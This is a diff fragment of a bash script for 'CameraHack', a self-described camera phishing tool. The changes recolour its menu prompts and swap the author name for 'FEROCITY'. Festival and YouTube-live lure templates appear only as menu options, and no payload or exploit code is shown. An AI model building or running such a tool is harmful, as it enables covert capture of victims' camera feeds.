@@ -459,7 +459,7 @@ echo -e "\e[1;96m< < ============== < \e[93mChoose Option \e[96m> ==============
 echo ""
 
 sleep 1
-printf "${cyan}\nMr${nc}@${cyan}Mahan ${red}$ ${nc}"
+printf "${red}\nMr${nc}@${red} FEROCITY${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -467,7 +467,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nMr${nc}@${cyan}Sadeghi ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${red}\n\nMr${nc}@${res}FEROCITY${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -478,7 +478,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nMr${nc}@${cyan}Sadeghi ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${red}\n\nMr${nc}@${red} FEROCITY${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -512,7 +512,7 @@ read option
         echo -e "$red[ToolName]  ${cyan}  :[CameraHack]
 $red[Version]    ${red} :[2.1]
 $red[Description]${white} :[Camera Phishing tool]
-$red[Author]     ${red} :[Mr FEROCITY]
+$red[Author]     ${red} :[Mr*FEROCITY]
 $red[Github]     ${cyan} :[https://github.com/ferocity-m-t/] 
 $red[Rubika]     ${cyan} :[https://rubika.ir/Ferocity036]
 $red[Telegarm]   ${cyan} :[https://rubika.ir/Ferocity036]"
